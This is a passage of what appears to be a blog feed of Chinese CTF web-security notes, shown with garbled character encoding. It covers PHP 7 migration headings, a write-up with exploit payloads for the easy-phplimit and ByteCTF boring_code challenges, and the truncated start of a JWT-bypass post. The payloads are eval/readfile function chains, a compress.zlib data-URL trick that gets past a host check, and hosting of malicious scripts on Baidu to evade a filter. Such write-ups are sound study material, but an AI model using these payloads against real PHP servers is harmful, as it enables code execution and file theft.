çš„æ–¹æ³•ï¼Œæœªæ¥å¯èƒ½ä¼šå½»åº•ç§»é™¤è¯¥åŠŸèƒ½ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bar</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;I am not static!&#x27;</span>;<br>    &#125;<br>&#125;<br><br>foo::<span class="hljs-title function_ invoke__">bar</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="æ‚é¡¹"><a href="#æ‚é¡¹" class="headerlink" title="æ‚é¡¹"></a>æ‚é¡¹</h1><h2 id="é”™è¯¯å’Œå¼‚å¸¸å¤„ç†ç›¸å…³çš„å˜æ›´-Â¶"><a href="#é”™è¯¯å’Œå¼‚å¸¸å¤„ç†ç›¸å…³çš„å˜æ›´-Â¶" class="headerlink" title="é”™è¯¯å’Œå¼‚å¸¸å¤„ç†ç›¸å…³çš„å˜æ›´ Â¶"></a>é”™è¯¯å’Œå¼‚å¸¸å¤„ç†ç›¸å…³çš„å˜æ›´<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.error-handling"> Â¶</a></h2><h2 id="HTTP-RAW-POST-DATA-è¢«ç§»é™¤-Â¶"><a href="#HTTP-RAW-POST-DATA-è¢«ç§»é™¤-Â¶" class="headerlink" title="$HTTP_RAW_POST_DATA è¢«ç§»é™¤ Â¶"></a>$HTTP_RAW_POST_DATA è¢«ç§»é™¤<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.http-raw-post-data"> Â¶</a></h2><h2 id="ä»ä¸åŒ¹é…çš„ä¸Šä¸‹æ–‡å‘èµ·è°ƒç”¨-Â¶"><a href="#ä»ä¸åŒ¹é…çš„ä¸Šä¸‹æ–‡å‘èµ·è°ƒç”¨-Â¶" class="headerlink" title="ä»ä¸åŒ¹é…çš„ä¸Šä¸‹æ–‡å‘èµ·è°ƒç”¨ Â¶"></a>ä»ä¸åŒ¹é…çš„ä¸Šä¸‹æ–‡å‘èµ·è°ƒç”¨<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.incompatible-this"> Â¶</a></h2><h2 id="å‡½æ•°å®šä¹‰ä¸å¯ä»¥åŒ…å«å¤šä¸ªåŒåå‚æ•°-Â¶"><a href="#å‡½æ•°å®šä¹‰ä¸å¯ä»¥åŒ…å«å¤šä¸ªåŒåå‚æ•°-Â¶" class="headerlink" title="å‡½æ•°å®šä¹‰ä¸å¯ä»¥åŒ…å«å¤šä¸ªåŒåå‚æ•° Â¶"></a>å‡½æ•°å®šä¹‰ä¸å¯ä»¥åŒ…å«å¤šä¸ªåŒåå‚æ•°<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.func-parameters"> Â¶</a></h2><h2 id="åœ¨å‡½æ•°ä¸­æ£€è§†å‚æ•°å€¼ä¼šè¿”å›-å½“å‰-çš„å€¼-Â¶"><a href="#åœ¨å‡½æ•°ä¸­æ£€è§†å‚æ•°å€¼ä¼šè¿”å›-å½“å‰-çš„å€¼-Â¶" class="headerlink" title="åœ¨å‡½æ•°ä¸­æ£€è§†å‚æ•°å€¼ä¼šè¿”å› å½“å‰ çš„å€¼ Â¶"></a>åœ¨å‡½æ•°ä¸­æ£€è§†å‚æ•°å€¼ä¼šè¿”å› <em>å½“å‰</em> çš„å€¼<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.func-parameter-modified"> Â¶</a></h2><h2 id="INI-æ–‡ä»¶ä¸­-æ³¨é‡Šæ ¼å¼è¢«ç§»é™¤-Â¶"><a href="#INI-æ–‡ä»¶ä¸­-æ³¨é‡Šæ ¼å¼è¢«ç§»é™¤-Â¶" class="headerlink" title="INI æ–‡ä»¶ä¸­ # æ³¨é‡Šæ ¼å¼è¢«ç§»é™¤ Â¶"></a>INI æ–‡ä»¶ä¸­ <em>#</em> æ³¨é‡Šæ ¼å¼è¢«ç§»é™¤<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.ini-comments"> Â¶</a></h2><h2 id="Switch-è¯­å¥ä¸å¯ä»¥åŒ…å«å¤šä¸ª-default-å—-Â¶"><a href="#Switch-è¯­å¥ä¸å¯ä»¥åŒ…å«å¤šä¸ª-default-å—-Â¶" class="headerlink" title="Switch è¯­å¥ä¸å¯ä»¥åŒ…å«å¤šä¸ª default å— Â¶"></a>Switch è¯­å¥ä¸å¯ä»¥åŒ…å«å¤šä¸ª default å—<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.multiple-default"> Â¶</a></h2><h2 id="JSON-æ‰©å±•å·²ç»è¢«-JSOND-å–ä»£-Â¶"><a href="#JSON-æ‰©å±•å·²ç»è¢«-JSOND-å–ä»£-Â¶" class="headerlink" title="JSON æ‰©å±•å·²ç»è¢« JSOND å–ä»£ Â¶"></a>JSON æ‰©å±•å·²ç»è¢« JSOND å–ä»£<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.json-to-jsond"> Â¶</a></h2><h2 id="åœ¨æ•°å€¼æº¢å‡ºçš„æ—¶å€™ï¼Œå†…éƒ¨å‡½æ•°å°†ä¼šå¤±è´¥-Â¶"><a href="#åœ¨æ•°å€¼æº¢å‡ºçš„æ—¶å€™ï¼Œå†…éƒ¨å‡½æ•°å°†ä¼šå¤±è´¥-Â¶" class="headerlink" title="åœ¨æ•°å€¼æº¢å‡ºçš„æ—¶å€™ï¼Œå†…éƒ¨å‡½æ•°å°†ä¼šå¤±è´¥ Â¶"></a>åœ¨æ•°å€¼æº¢å‡ºçš„æ—¶å€™ï¼Œå†…éƒ¨å‡½æ•°å°†ä¼šå¤±è´¥<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.internal-function-failure-overflow"> Â¶</a></h2><h2 id="è‡ªå®šä¹‰ä¼šè¯å¤„ç†å™¨çš„è¿”å›å€¼ä¿®å¤-Â¶"><a href="#è‡ªå®šä¹‰ä¼šè¯å¤„ç†å™¨çš„è¿”å›å€¼ä¿®å¤-Â¶" class="headerlink" title="è‡ªå®šä¹‰ä¼šè¯å¤„ç†å™¨çš„è¿”å›å€¼ä¿®å¤ Â¶"></a>è‡ªå®šä¹‰ä¼šè¯å¤„ç†å™¨çš„è¿”å›å€¼ä¿®å¤<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.fixes-custom-session-handler"> Â¶</a></h2><h2 id="ç›¸ç­‰çš„å…ƒç´ åœ¨æ’åºæ—¶çš„é¡ºåºé—®é¢˜-Â¶"><a href="#ç›¸ç­‰çš„å…ƒç´ åœ¨æ’åºæ—¶çš„é¡ºåºé—®é¢˜-Â¶" class="headerlink" title="ç›¸ç­‰çš„å…ƒç´ åœ¨æ’åºæ—¶çš„é¡ºåºé—®é¢˜ Â¶"></a>ç›¸ç­‰çš„å…ƒç´ åœ¨æ’åºæ—¶çš„é¡ºåºé—®é¢˜<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.sort-order"> Â¶</a></h2><h2 id="é”™è¯¯çš„ä½¿ç”¨-break-å’Œ-switch-è¯­å¥-Â¶"><a href="#é”™è¯¯çš„ä½¿ç”¨-break-å’Œ-switch-è¯­å¥-Â¶" class="headerlink" title="é”™è¯¯çš„ä½¿ç”¨ break å’Œ switch è¯­å¥ Â¶"></a>é”™è¯¯çš„ä½¿ç”¨ break å’Œ switch è¯­å¥<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.break-continue"> Â¶</a></h2><h2 id="Mhash-ä¸å†æ˜¯ä¸€ä¸ªå•ç‹¬çš„æ‰©å±•äº†-Â¶"><a href="#Mhash-ä¸å†æ˜¯ä¸€ä¸ªå•ç‹¬çš„æ‰©å±•äº†-Â¶" class="headerlink" title="Mhash ä¸å†æ˜¯ä¸€ä¸ªå•ç‹¬çš„æ‰©å±•äº† Â¶"></a>Mhash ä¸å†æ˜¯ä¸€ä¸ªå•ç‹¬çš„æ‰©å±•äº†<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.mhash"> Â¶</a></h2><h2 id="æ ‡é‡ç±»å‹å£°æ˜-Â¶"><a href="#æ ‡é‡ç±»å‹å£°æ˜-Â¶" class="headerlink" title="æ ‡é‡ç±»å‹å£°æ˜ Â¶"></a>æ ‡é‡ç±»å‹å£°æ˜<a href="https://www.php.net/manual/zh/migration70.new-features.php#migration70.new-features.scalar-type-declarations"> Â¶</a></h2><h2 id="è¿”å›å€¼ç±»å‹å£°æ˜-Â¶"><a href="#è¿”å›å€¼ç±»å‹å£°æ˜-Â¶" class="headerlink" title="è¿”å›å€¼ç±»å‹å£°æ˜ Â¶"></a>è¿”å›å€¼ç±»å‹å£°æ˜<a href="https://www.php.net/manual/zh/migration70.new-features.php#migration70.new-features.return-type-declarations"> Â¶</a></h2><h2 id="ç”Ÿæˆå™¨å¯ä»¥è¿”å›è¡¨è¾¾å¼-Â¶"><a href="#ç”Ÿæˆå™¨å¯ä»¥è¿”å›è¡¨è¾¾å¼-Â¶" class="headerlink" title="ç”Ÿæˆå™¨å¯ä»¥è¿”å›è¡¨è¾¾å¼ Â¶"></a>ç”Ÿæˆå™¨å¯ä»¥è¿”å›è¡¨è¾¾å¼<a href="https://www.php.net/manual/zh/migration70.new-features.php#migration70.new-features.generator-return-expressions"> Â¶</a></h2><h2 id="å…è®¸åœ¨å…‹éš†è¡¨è¾¾å¼ä¸Šè®¿é—®å¯¹è±¡æˆå‘˜-Â¶"><a href="#å…è®¸åœ¨å…‹éš†è¡¨è¾¾å¼ä¸Šè®¿é—®å¯¹è±¡æˆå‘˜-Â¶" class="headerlink" title="å…è®¸åœ¨å…‹éš†è¡¨è¾¾å¼ä¸Šè®¿é—®å¯¹è±¡æˆå‘˜[ Â¶]("></a>å…è®¸åœ¨å…‹éš†è¡¨è¾¾å¼ä¸Šè®¿é—®å¯¹è±¡æˆå‘˜[ Â¶](</h2>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>phpå®¡è®¡</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¾ªç¯åµŒå¥—å‡½æ•°GetShell</title>
    <link href="/2024/08/31/%E5%BE%AA%E7%8E%AF%E5%B5%8C%E5%A5%97%E5%87%BD%E6%95%B0GetShell/"/>
    <url>/2024/08/31/%E5%BE%AA%E7%8E%AF%E5%B5%8C%E5%A5%97%E5%87%BD%E6%95%B0GetShell/</url>
    
    <content type="html"><![CDATA[<h1 id="å‡½æ•°å¦™ç”¨"><a href="#å‡½æ•°å¦™ç”¨" class="headerlink" title="å‡½æ•°å¦™ç”¨"></a>å‡½æ•°å¦™ç”¨</h1><h2 id="code-breaking-easy-phplimitå‡½æ•°çš„å·§å¦™æ­é…"><a href="#code-breaking-easy-phplimitå‡½æ•°çš„å·§å¦™æ­é…" class="headerlink" title="code-breaking_easy-phplimitå‡½æ•°çš„å·§å¦™æ­é…"></a>code-breaking_easy-phplimitå‡½æ•°çš„å·§å¦™æ­é…</h2><h3 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h3><ul><li><a href="https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-%E9%A2%98%E8%A7%A3-%E5%AD%A6%E4%B9%A0%E7%AF%87/#get-defined-vars">https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-%E9%A2%98%E8%A7%A3-%E5%AD%A6%E4%B9%A0%E7%AF%87/#get-defined-vars</a></li><li><a href="https://xz.aliyun.com/t/6316">https://xz.aliyun.com/t/6316</a></li><li><a href="https://www.cnblogs.com/BOHB-yunying/p/11616311.html">https://www.cnblogs.com/BOHB-yunying/p/11616311.html</a></li></ul><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>())));&amp;b=<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;../&#x27;</span>));<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;../flag_phpbyp4ss&#x27;</span>));<br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">array_reverse</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">getcwd</span>())))))));<br></code></pre></td></tr></table></figure><h2 id="ByteCTF-boring-code"><a href="#ByteCTF-boring-code" class="headerlink" title="ByteCTF boring_code"></a>ByteCTF boring_code</h2><h3 id="å‚è€ƒæ–‡ç« -1"><a href="#å‚è€ƒæ–‡ç« -1" class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h3><ul><li><p><a href="http://www.guildhab.top/?p=1077">http://www.guildhab.top/?p=1077</a></p></li><li><p><a href="https://xz.aliyun.com/t/6316">https://xz.aliyun.com/t/6316</a></p></li></ul><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid_url</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">filter_var</span>(<span class="hljs-variable">$url</span>, FILTER_VALIDATE_URL)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/data:\/\//i&#x27;</span>, <span class="hljs-variable">$url</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$url</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_valid_url</span>(<span class="hljs-variable">$url</span>)) &#123;<br>        <span class="hljs-variable">$r</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/baidu\.com$/&#x27;</span>, <span class="hljs-variable">$r</span>[<span class="hljs-string">&#x27;host&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$code</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$code</span>)) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#x27;</span>, <span class="hljs-variable">$code</span>)) &#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;bye~&#x27;</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error: host not allowed&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error: invalid url&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>1.ç¬¬ä¸€æ­¥</p><p>ç¬¬ä¸€æ­¥éœ€è¦ç»•è¿‡<code>preg_match</code>çš„æ£€æµ‹ï¼Œç½‘ä¸Šè§åˆ°çš„payloadéƒ½æ˜¯é€šè¿‡è´­ä¹°åŸŸåï¼Œurlè·³è½¬ç­‰æ–¹æ³•è¿›è¡Œç»•è¿‡ã€‚å…¶å®å¯ä»¥é€šè¿‡ä»£ç ç»•è¿‡ã€‚</p><p><strong>æˆ‘çš„æ–¹æ³•</strong></p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">compress</span>.zlib://<span class="hljs-class"><span class="hljs-keyword">data</span>:@baidu.com/baidu.com,phpinfo()</span><br></code></pre></td></tr></table></figure><p><code>compress.zlib</code>ç»•è¿‡dataåè®®çš„æ£€æµ‹ï¼Œ<code>@</code>ä½¿<code>data:</code>è¢«è§£é‡Šä¸ºç”¨æˆ·åå’Œå¯†ç ï¼Œ<code>baidu.com/baidu.com</code>ä¸­åªè¦åŒ…å«<code>/</code>å°±ä¼šè¢«è§£é‡Šä¸ºåˆæ³•çš„<code>media-type</code></p><p><img src="/../img/19-9-27_PHP_%E5%87%BD%E6%95%B0%E5%A6%99%E7%94%A8_bytectf_1.png"></p><p><strong>å…¶ä»–æ–¹æ³•</strong></p><ul><li><p>è´­ä¹°ä¸€ä¸ª xxxxbaidu.com çš„åŸŸå</p></li><li><p>ç™¾åº¦ç½‘ç›˜é“¾æ¥</p><p><strong>è¿™ç§æ–¹æ³•çš„æ€è·¯æ˜¯å°†æ¶æ„ä»£ç ä¸Šä¼ åˆ°ç™¾åº¦ç½‘ç›˜ , ç„¶åé€šè¿‡ç™¾åº¦ç½‘ç›˜çš„ä¸‹è½½é“¾æ¥æ¥ç»•è¿‡ baidu.com çš„ä¸»æœºåé™åˆ¶ .</strong></p><ol><li><p><strong>å°†ä¸€ä¸ªæ¶æ„è„šæœ¬ä¸Šä¼ åˆ°ç™¾åº¦ç½‘ç›˜( è¿™é‡Œä»¥ phpinfo() ä¸ºä¾‹ )</strong></p><p><img src="/../img/19-9-27_PHP_%E5%87%BD%E6%95%B0%E5%A6%99%E7%94%A8_bytectf_3.png"></p></li><li><p><strong>é€šè¿‡å¼€å‘è€…å·¥å…·( F12 ) , åœ¨ network é€‰é¡¹å¡ä¸­å¯ä»¥æ‰¾åˆ°ç›®æ ‡æ–‡ä»¶çš„é“¾æ¥</strong></p><p><img src="/../img/19-9-27_PHP_%E5%87%BD%E6%95%B0%E5%A6%99%E7%94%A8_bytectf_2.png"></p></li></ol></li><li><p>ç™¾åº¦è´´å§ï¼ˆ<a href="https://www.4xseo.com/marketing/1280/">https://www.4xseo.com/marketing/1280/</a></p></li><li><p>ç™¾åº¦çˆ¬è™«</p><p>å…¶åŸç†å¤§æ¦‚å°±æ˜¯ : <strong>ç™¾åº¦çš„æœç´¢å¼•æ“çˆ¬è™«ä¼šçˆ¬åˆ°ä½ çš„ä¸ªäººç«™ç‚¹ , å½“ä½ åœ¨ç™¾åº¦ä¸Šç‚¹å‡»è‡ªå·±ç«™ç‚¹æ—¶ , å¹¶ä¸æ˜¯ç›´æ¥è®¿é—® . è€Œæ˜¯åˆ©ç”¨ç™¾åº¦çš„é‡å®šå‘æœºåˆ¶ , å°†ä½ çš„ç½‘å€è½¬æ¢æˆ<code>http://www.baidu.com/link?url=xxxxxxxxxxxxxxx</code> , é€šè¿‡è¿™ä¸ªé“¾æ¥å¯ä»¥ç»•è¿‡ç¬¬ä¸€å±‚é˜²å¾¡å¹¶ä¸”æ‹¿åˆ°ä½ ç«™ç‚¹ä¸Šçš„æ¶æ„è„šæœ¬ .</strong></p></li></ul><p>2.ç¬¬äºŒæ­¥</p><p>æˆ‘ä»¬è¦è·å–<code>.</code>ï¼Œå¯ä»¥é€šè¿‡è·å–<code>.</code>çš„asciiç ï¼Œç„¶åé€šè¿‡<code>chr</code>å‡½æ•°å¾—åˆ°ã€‚å†™äº†ä¸ªè„šæœ¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$functions</span>=<span class="hljs-title function_ invoke__">get_defined_functions</span>()[<span class="hljs-string">&#x27;internal&#x27;</span>];<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFucntionParameter1</span>(<span class="hljs-params"><span class="hljs-variable">$func</span></span>) </span>&#123;<br>    <span class="hljs-variable">$ReflectionFunc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">\ReflectionFunction</span>(<span class="hljs-variable">$func</span>);<br>    <span class="hljs-variable">$nums</span>=<span class="hljs-variable">$ReflectionFunc</span>-&gt;<span class="hljs-title function_ invoke__">getNumberOfRequiredParameters</span>();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$nums</span>===<span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$func</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-comment">#@print_r($func());</span><br>    <span class="hljs-comment">#echo &quot;\n#####\n&quot;;</span><br>    &#125;<br>&#125;<br><br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$functions</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$vul</span>)&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log|readline/i&#x27;</span>, <span class="hljs-variable">$vul</span>))&#123;<br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_ invoke__">getFucntionParameter1</span>(<span class="hljs-variable">$vul</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸»è¦ä½¿ç”¨äº†åå°„æ£€æµ‹å‡½æ•°çš„å‚æ•°ã€‚</p><p><strong>payload</strong></p><ul><li><p><code>crypt</code>å‡½æ•°çš„è¿”å›å€¼æœ€åä¸€ä½å¯èƒ½ä¸º<code>.</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>())))))))))<span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-title function_ invoke__">end</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>()))))))));<br></code></pre></td></tr></table></figure></li><li><p><code>localeconv</code>å‡½æ•°</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>rce</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JWTè®¤è¯ç»•è¿‡</title>
    <link href="/2024/08/31/jwt%E7%AD%89%E8%AE%A4%E8%AF%81went/"/>
    <url>/2024/08/31/jwt%E7%AD%89%E8%AE%A4%E8%AF%81went/</url>
    
    <content type="html"><![CDATA[<h1 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h1><p>jwtæ˜¯ä¸€ä¸ªè½»é‡çº§çš„è®¤è¯è§„èŒƒ å¯¹æ•°æ®è¿›è¡Œç­¾åç”¨çš„</p><p>é˜²æ­¢æ•°æ®è¢«ç¯¡æ”¹</p><ol><li>å¯¹æ•°æ®è¿›è¡ŒåŠ å¯†   å†…å®¹å¯¹ç”¨æˆ·æ•æ„Ÿï¼Œä¸éœ€è¦å¯¹å¤–</li><li>å¯¹æ•°æ®è¿›è¡Œç­¾å   å†…å®¹ä¸æ•æ„Ÿï¼Œä½†æ˜¯ç¡®ä¿ä¸è¢«ç¯¡æ”¹</li></ol><p>JWTæ˜¯å¯¹æ•°æ®è¿›è¡Œç­¾åï¼Œé˜²æ­¢æ•°æ®ç¯¡æ”¹ï¼Œè€Œä¸æ˜¯é˜²æ­¢æ•°æ®è¢«è¯»å–<br>JSON Web Token (JWT)<br>?username&#x3D;admin&amp;score&#x3D;100  åˆ«äººä¼ é€’è¿‡ç¨‹ä¸­ï¼Œä¼šå¯¹ç§¯åˆ†è¿›è¡Œç¯¡æ”¹<br>?username&#x3D;admin&amp;score&#x3D;100&amp;token&#x3D;c17961f5f372f8cf039113909d715943<br>? md5(score&#x3D;100&amp;username&#x3D;admin)&#x3D;c17961f5f372f8cf039113909d715943<br>?score&#x3D;100&amp;username&#x3D;admin&amp;token&#x3D;c17961ff372f8cf039113909d715943<br>ç¯¡æ”¹æ•°æ®çš„åŒæ—¶ï¼Œç ´è§£äº†ç®—æ³•ï¼Œç¯¡æ”¹äº†ç­¾å<br>åŠ ç›æœºåˆ¶ï¼Œsalt<br>md5(score&#x3D;100&amp;username&#x3D;admin_ctfshow)&#x3D;20f3fa445b286df3f1a518fcbcd8bbe2</p><p>ç›å€¼æœ‰å¯èƒ½è¢«çˆ†ç ´ï¼Œä¹Ÿæœ‰å¯èƒ½è¢«æ³„éœ²<br>å¢åŠ æ›´é«˜çš„å¯†ç ç®—æ³•ï¼Œä¸å†ç®€å•çš„md5ï¼Œç›å€¼ä¹Ÿå¤§å¹…åº¦æé«˜é•¿åº¦ï¼Œè¾¾åˆ°å‡ ç™¾ä¸Šåƒä½ æ¥ä¿è¯æˆ‘ä»¬çš„æ•°æ®ä¸è¢«ç¯¡æ”¹  æˆ–è€…å³ä½¿ç¯¡æ”¹äº†æˆ‘ä»¬èƒ½å‘ç°<br>ç”± Headerã€Payloadã€Signature ä¸‰éƒ¨åˆ†æ„æˆï¼Œç”¨ç‚¹åˆ†éš”ï¼Œæ•°æ®é‡‡ç”¨Base64URLè¿›è¡Œç¼–ç </p><h2 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h2><p>Headeræ˜¯JWTçš„ç¬¬ä¸€ä¸ªéƒ¨åˆ†ï¼Œæ˜¯ä¸€ä¸ª JSON å¯¹è±¡ï¼Œä¸»è¦å£°æ˜äº†JWTçš„ç­¾åç®—æ³•ï¼Œå¦‚â€œHS256â€ã€â€œRS256â€ç­‰ï¼Œä»¥åŠå…¶ä»–å¯é€‰å‚æ•°ï¼Œå¦‚â€œkidâ€ç­‰ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 